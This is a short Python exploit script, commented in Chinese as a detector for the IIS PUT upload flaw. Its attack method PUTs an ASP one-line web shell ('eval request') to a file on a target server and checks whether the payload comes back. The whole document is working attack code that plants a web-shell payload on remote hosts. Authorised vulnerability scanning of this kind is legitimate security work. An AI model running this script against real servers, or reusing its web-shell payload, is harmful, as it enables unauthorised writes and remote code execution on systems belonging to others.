# IIS PUT 上传漏洞检测脚本
# author：ske
import requests


class Exploit:

    def attack(self, url):
        url = '{}/2222.txt'.format(url)
        data = '<%eval request("1111111111")%>'
        res = requests.put(url=url, data=data, timeout=5)
        html_text = requests.get(url).text
        if '<%eval request("1111111111")%>' in html_text:
            return '[+] {} 存在IIS PUT上传'.format(url)